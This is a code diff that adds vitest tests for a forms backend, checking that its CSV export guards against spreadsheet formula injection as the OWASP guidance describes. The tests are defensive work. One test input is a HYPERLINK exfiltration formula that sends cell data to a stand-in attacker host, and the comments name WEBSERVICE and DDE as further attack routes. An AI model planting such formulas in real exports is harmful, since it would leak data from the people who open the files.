@@ -12,10 +12,11 @@
  *
  * SQLite-specific concerns (migrations/user_version, CHECK constraints,
  * prepared-statement source assertions, VACUUM INTO backups, corrupted-row
- * skipping, CSV formula-injection guard, payments/files cascade) live in
- * `sqlite.test.ts` — they aren't part of the generic backend-agnostic
- * contract because a future adapter (e.g. Postgres) may not share SQLite's
- * migration/backup mechanism.
+ * skipping, payments/files cascade) live in `sqlite.test.ts` — they aren't
+ * part of the generic backend-agnostic contract because a future adapter
+ * (e.g. Postgres) may not share SQLite's migration/backup mechanism. The
+ * CSV formula-injection guard IS in this contract (0.1.14): the export's
+ * bytes must not depend on which backend produced them.
  */
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 import type { StorageAdapter } from './adapter.js';
@@ -712,6 +713,158 @@ export function runStorageContract(makeAdapter: () => StorageAdapter): void {
         expect(await adapter.consumeRateLimitToken('bucket-cap', capacity, refillPerSec, 100_000_000)).toBe(true);
         expect(await adapter.consumeRateLimitToken('bucket-cap', capacity, refillPerSec, 100_000_000)).toBe(true);
         expect(await adapter.consumeRateLimitToken('bucket-cap', capacity, refillPerSec, 100_000_000)).toBe(false);
+      });
+    });
+
+    // The owner opens /forms-admin/export.csv in Excel, Sheets or
+    // LibreOffice, and almost every cell in it is visitor-controlled: an
+    // abandoned draft stores whatever was typed, the abandon payload's field
+    // NAMES come from the request, and userAgent/referrer are request
+    // headers. A cell that reaches the spreadsheet starting with a formula
+    // trigger runs as a formula on the owner's machine (data exfiltration
+    // via HYPERLINK/WEBSERVICE, DDE on older Excel). OWASP CSV Injection
+    // guidance: prefix ' when a cell starts with = + - @ TAB CR LF, quote any
+    // cell containing , " CR or LF, double the inner quotes. Every backend
+    // must produce the same bytes, so this lives in the shared contract.
+    describe('exportCsv — spreadsheet formula injection guard (T-01-33)', () => {
+      const FIXED_HEADER = 'id,siteId,formId,status,visitorUuid,ip,userAgent,pageUrl,referrer,createdAt,updatedAt';
+
+      /** Exports one entry whose only field is `note`; `note` is the row's last cell. */
+      async function exportWithNote(value: unknown): Promise<string> {
+        await adapter.createEntry(entryInput({ fields: { note: value } }));
+        return adapter.exportCsv({ siteId: 'site-a' });
+      }
+
+      /**
+       * Splits CSV text into cells the way a lenient spreadsheet importer
+       * does: RFC 4180 quotes are honored, and outside quotes a bare CR, a
+       * bare LF or a CRLF each ends a row. Returns every cell's text.
+       */
+      function spreadsheetCells(csv: string): string[] {
+        const cells: string[] = [];
+        let cell = '';
+        let quoted = false;
+        for (let i = 0; i < csv.length; i++) {
+          const ch = csv[i];
+          if (quoted) {
+            if (ch === '"' && csv[i + 1] === '"') {
+              cell += '"';
+              i++;
+            } else if (ch === '"') {
+              quoted = false;
+            } else {
+              cell += ch;
+            }
+          } else if (ch === '"' && cell === '') {
+            quoted = true;
+          } else if (ch === ',' || ch === '\r' || ch === '\n') {
+            cells.push(cell);
+            cell = '';
+            if (ch === '\r' && csv[i + 1] === '\n') i++;
+          } else {
+            cell += ch;
+          }
+        }
+        cells.push(cell);
+        return cells;
+      }
+
+      it.each([
+        ['= (equals)', '=1+1', "'=1+1"],
+        ['+ (plus)', '+1+1', "'+1+1"],
+        ['- (minus)', '-1+1', "'-1+1"],
+        ['@ (at)', '@SUM(A1)', "'@SUM(A1)"],
+        ['TAB', '\t=1+1', "'\t=1+1"],
+        ['CR', '\r=1+1', `"'\r=1+1"`],
+        ['LF', '\n=1+1', `"'\n=1+1"`],
+      ])('prefixes a value starting with %s with a single quote', async (_name, value, expectedCell) => {
+        const csv = await exportWithNote(value);
+        expect(csv.endsWith(`,${expectedCell}`)).toBe(true);
+      });
+
+      it.each([
+        ['a bare CR', 'line one\rline two', '"line one\rline two"'],
+        ['an LF', 'line one\nline two', '"line one\nline two"'],
+        ['a CRLF', 'line one\r\nline two', '"line one\r\nline two"'],
+        ['a comma', 'Lovelace, Ada', '"Lovelace, Ada"'],
+        ['a double quote', 'she said "hi"', '"she said ""hi"""'],
+      ])('quotes a value containing %s, doubling any inner quotes', async (_name, value, expectedCell) => {
+        const csv = await exportWithNote(value);
+        expect(csv.endsWith(`,${expectedCell}`)).toBe(true);
+      });
+
+      it('neutralizes a realistic exfiltration formula: prefixed, quoted, inner quotes doubled', async () => {
+        const csv = await exportWithNote('=HYPERLINK("https://attacker.example/?d="&A1,"Click")');
+        expect(csv.endsWith(`,"'=HYPERLINK(""https://attacker.example/?d=""&A1,""Click"")"`)).toBe(true);
+      });
+
+      it('keeps a formula that follows a mid-value CR inside the quoted cell, so it cannot start a new row', async () => {
+        const csv = await exportWithNote('Thanks\r=1+1');
+        expect(csv.endsWith(',"Thanks\r=1+1"')).toBe(true);
+      });
+
+      it('guards field NAMES in the header row, not just values', async () => {
+        await adapter.createEntry(entryInput({ fields: { '=1+1': 'x' } }));
+        const csv = await adapter.exportCsv({ siteId: 'site-a' });
+        expect(csv.startsWith(`${FIXED_HEADER},'=1+1\n`)).toBe(true);
+      });
+
+      it('guards non-string field values, which are exported as JSON text', async () => {
+        await adapter.createEntry(
+          entryInput({
+            fields: { a: { city: '=1+1', note: 'a\rb' }, b: ['@SUM(A1)'], c: -5 },
+          }),
+        );
+        const csv = await adapter.exportCsv({ siteId: 'site-a' });
+        // JSON.stringify escapes the CR to the two characters \r, so the
+        // object cell holds no raw line break; the formula sits mid-cell.
+        expect(csv.endsWith(',"{""city"":""=1+1"",""note"":""a\\rb""}","[""@SUM(A1)""]",\'-5')).toBe(true);
+      });
+
+      it('leaves ordinary values byte-for-byte unchanged', async () => {
+        await adapter.createEntry(
+          entryInput({
+            fields: {
+              a: 'Ada Lovelace',
+              b: 'ada@example.com',
+              c: '42',
+              d: 'x=y',
+              e: 'a-b',
+              f: "O'Brien",
+              g: 'café',
+              h: '',
+            },
+          }),
+        );
+        const csv = await adapter.exportCsv({ siteId: 'site-a' });
+        expect(csv.endsWith(",Ada Lovelace,ada@example.com,42,x=y,a-b,O'Brien,café,")).toBe(true);
+      });
+
+      it('no cell of a hostile export starts with a formula trigger once a spreadsheet splits it into rows and cells', async () => {
+        const entry = await adapter.createEntry(
+          entryInput({
+            fields: {
+              '\r=FIELDNAME()': 'x',
+              crLead: '\r=1+1',
+              crMid: 'Thanks\r=1+1',
+              crlfMid: 'Thanks\r\n@SUM(A1)',
+              lfMid: 'x\n+1',
+              tabLead: '\t-1',
+              commaMid: 'x,=1+1',
+              quoteLead: '"=1+1',
+            },
+            userAgent: '\r=UA()',
+            referrer: 'https://example.com/\r@REF()',
+            pageUrl: '=PAGE()',
+            geo: { city: '=GEO()' },
+            journey: [{ url: '/a', title: '\r=JOURNEY()', ts: 1, durationMs: 1 }],
+          }),
+        );
+        await adapter.attachFiles(entry.id, [{ filename: '=FILE().pdf', storage: 'email-only' }]);
+
+        const csv = await adapter.exportCsv({ siteId: 'site-a' });
+        const live = spreadsheetCells(csv).filter((cell) => /^[=+\-@\t\r\n]/.test(cell));
+        expect(live).toEqual([]);
       });
     });
   });
